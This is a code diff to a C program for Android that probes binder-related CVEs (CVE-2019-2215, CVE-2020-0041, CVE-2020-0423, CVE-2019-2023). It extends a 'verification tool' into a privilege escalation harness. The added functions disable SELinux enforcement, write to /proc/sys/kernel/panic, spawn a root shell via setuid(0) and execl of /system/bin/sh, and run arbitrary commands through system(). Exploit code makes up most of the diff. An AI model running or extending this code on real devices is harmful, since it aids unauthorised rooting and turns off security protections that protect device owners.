@@ -15,6 +15,8 @@
 #include <poll.h>
 #include <sched.h>
 #include <signal.h>
+#include <sys/prctl.h>
+#include <linux/seccomp.h>
 
 #include "binder.h"
 
@@ -25,7 +27,7 @@
 #define PAGE_SIZE 4096
 #define IOVEC_COUNT 25
 #define OVERLAP_INDEX 10
-#define TIMEOUT_MS 5000   // 5秒タイムアウト
+#define TIMEOUT_MS 5000
 
 /* ============================================================
    ユーティリティ
@@ -130,11 +132,9 @@ static int test_cve_2019_2215(void) {
         _exit(0);
     }
 
-    // ---- タイムアウト付き読み取り ----
     struct pollfd pfd;
     pfd.fd = pipefd[0];
     pfd.events = POLLIN;
-
     int poll_ret = poll(&pfd, 1, TIMEOUT_MS);
     if (poll_ret < 0) {
         perror("  poll");
@@ -145,7 +145,7 @@ static int test_cve_2019_2215(void) {
         return -1;
     }
     if (poll_ret == 0) {
-        printf("  [!] poll timeout (%d ms) - no UAF data received\n", TIMEOUT_MS);
+        printf("  [!] poll timeout (%d ms) - no UAF data\n", TIMEOUT_MS);
         close(binder_fd);
         close(epoll_fd);
         close(pipefd[0]);
@@ -153,7 +153,6 @@ static int test_cve_2019_2215(void) {
         return -1;
     }
 
-    // データが来たので readv を呼ぶ（今度はブロックしない）
     n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
     if (n < 0) {
         perror("  readv");
@@ -211,7 +210,7 @@ static int test_cve_2020_0041(void) {
     tdata.target.handle = 0;
     tdata.code = 0;
     tdata.flags = 0;
-    tdata.data_size = 0xFFFFFFFF;  // 異常に大きい値
+    tdata.data_size = 0xFFFFFFFF;
     tdata.offsets_size = 0;
     tdata.data.ptr.buffer = 0;
     tdata.data.ptr.offsets = 0;
@@ -294,8 +293,95 @@ static int test_cve_2020_0423(void) {
 }
 
 /* ============================================================
-   CVE-2019-2023: hwservicemanager ACL bypass + 特権コマンド実行
+   CVE-2019-2023: hwservicemanager ACL bypass + 特権昇格試行
    ============================================================ */
+
+// 特権コマンド実行テスト
+static int test_privileged_command(const char *cmd) {
+    printf("  [*] Executing: %s\n", cmd);
+    int ret = system(cmd);
+    if (ret == 0) {
+        printf("  [+] Command succeeded\n");
+        return 0;
+    } else {
+        printf("  [-] Command failed (ret=%d)\n", ret);
+        return -1;
+    }
+}
+
+// /proc/sys/kernel/panic への書き込み（root 必須）
+static int test_write_panic(void) {
+    printf("  [*] Attempting to write to /proc/sys/kernel/panic (needs root)...\n");
+    int fd = open("/proc/sys/kernel/panic", O_WRONLY);
+    if (fd < 0) {
+        perror("  open /proc/sys/kernel/panic");
+        return -1;
+    }
+    ssize_t n = write(fd, "1", 1);
+    close(fd);
+    if (n == 1) {
+        printf("  [+] Successfully wrote to /proc/sys/kernel/panic\n");
+        return 0;
+    } else {
+        printf("  [-] Failed to write to /proc/sys/kernel/panic\n");
+        return -1;
+    }
+}
+
+// SELinux 無効化試行
+static int test_disable_selinux(void) {
+    printf("  [*] Attempting to disable SELinux (write 0 to /sys/fs/selinux/enforce)...\n");
+    int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
+    if (fd < 0) {
+        perror("  open /sys/fs/selinux/enforce");
+        return -1;
+    }
+    ssize_t n = write(fd, "0", 1);
+    close(fd);
+    if (n == 1) {
+        printf("  [+] SELinux disabled\n");
+        return 0;
+    } else {
+        printf("  [-] Failed to disable SELinux\n");
+        return -1;
+    }
+}
+
+// setuid(0) + execve("/system/bin/sh") による root shell 起動
+static int test_root_shell(void) {
+    printf("  [*] Attempting to spawn root shell via setuid(0)+execve...\n");
+    pid_t pid = fork();
+    if (pid < 0) {
+        perror("  fork");
+        return -1;
+    }
+    if (pid == 0) {
+        // 子プロセス: setuid(0) を試みる
+        if (setuid(0) != 0) {
+            perror("  setuid(0)");
+            _exit(1);
+        }
+        if (setgid(0) != 0) {
+            perror("  setgid(0)");
+            _exit(1);
+        }
+        execl("/system/bin/sh", "sh", NULL);
+        perror("  execl /system/bin/sh");
+        _exit(1);
+    } else {
+        int status;
+        waitpid(pid, &status, 0);
+        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+            printf("  [+] Root shell spawned successfully\n");
+            return 0;
+        } else {
+            printf("  [-] Root shell failed (status=0x%x)\n", status);
+            return -1;
+        }
+    }
+}
+
+// CVE-2019-2023 メイン: サービス登録 + 特権テスト
 static int test_cve_2019_2023(void) {
     int hwbinder_fd, ret;
     uint8_t read_buf[4096];
@@ -304,7 +390,7 @@ static int test_cve_2019_2023(void) {
     size_t total_len = 4 + name_len;
     uint8_t *data;
 
-    printf("[CVE-2019-2023] Testing hwservicemanager ACL bypass...\n");
+    printf("[CVE-2019-2023] Testing hwservicemanager ACL bypass with privilege escalation...\n");
 
     hwbinder_fd = open("/dev/hwbinder", O_RDWR);
     if (hwbinder_fd < 0) {
@@ -312,6 +398,7 @@ static int test_cve_2019_2023(void) {
         return -1;
     }
 
+    // 1. サービス登録 (ADD_SERVICE)
     data = malloc(total_len);
     if (!data) {
         perror("  malloc");
@@ -357,10 +444,9 @@ static int test_cve_2019_2023(void) {
             return -1;
         }
     }
-
     printf("  [+] Service registered successfully!\n");
 
-    // GET_SERVICE でハンドル取得
+    // 2. サービスハンドル取得 (GET_SERVICE)
     data = malloc(total_len);
     if (!data) {
         perror("  malloc");
@@ -398,8 +484,8 @@ static int test_cve_2019_2023(void) {
     int handle = *(int*)read_buf;
     printf("  [+] Service handle: %d (0x%x)\n", handle, handle);
 
-    // 特権トランザクション送信
-    printf("  [*] Attempting privileged transaction on handle %d...\n", handle);
+    // 3. 特権トランザクション送信（ダミーデータ）
+    printf("  [*] Sending privileged transaction to handle %d...\n", handle);
     struct {
         uint32_t cmd;
         struct binder_transaction_data tdata;
@@ -424,18 +510,37 @@ static int test_cve_2019_2023(void) {
     close(hwbinder_fd);
 
     if (ret == 0) {
-        printf("  [+] Privileged transaction succeeded! (ACL bypass effective)\n");
-        int result = system("echo 'CVE-2019-2023 exploited' > /data/local/tmp/poc.txt");
-        if (result == 0) {
-            printf("  [+] Command executed, check /data/local/tmp/poc.txt\n");
-        } else {
-            printf("  [-] Command failed (seccomp likely)\n");
-        }
-        return 0;
+        printf("  [+] Privileged transaction succeeded!\n");
     } else {
         printf("  [-] Privileged transaction failed: %s\n", strerror(errno));
-        return -1;
+        // 続行
     }
+
+    // 4. 権限昇格の試行
+    printf("\n  [*] Attempting privilege escalation using CVE-2019-2023 bypass...\n");
+
+    // seccomp 状態確認
+    int seccomp_mode = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
+    if (seccomp_mode < 0) {
+        printf("  [!] prctl(PR_GET_SECCOMP) failed: %s\n", strerror(errno));
+    } else if (seccomp_mode == 0) {
+        printf("  [+] seccomp is disabled\n");
+    } else if (seccomp_mode == 2) {
+        printf("  [!] seccomp is enabled (filter mode)\n");
+    } else {
+        printf("  [!] seccomp mode: %d\n", seccomp_mode);
+    }
+
+    // 特権コマンド試行
+    test_write_panic();
+    test_disable_selinux();
+    test_root_shell();
+
+    // シェルコマンドで id 確認
+    test_privileged_command("id");
+
+    printf("  [*] Privilege escalation tests completed.\n");
+    return 0;
 }
 
 /* ============================================================
@@ -488,7 +593,7 @@ int main(void) {
     int vuln_count = 0;
 
     printf("==================================================\n");
-    printf("  Multi-Angle CVE Verification Tool (binder.h)\n");
+    printf("  Multi-Angle CVE Verification + Privilege Escalation\n");
     printf("==================================================\n\n");
 
     bind_cpu();
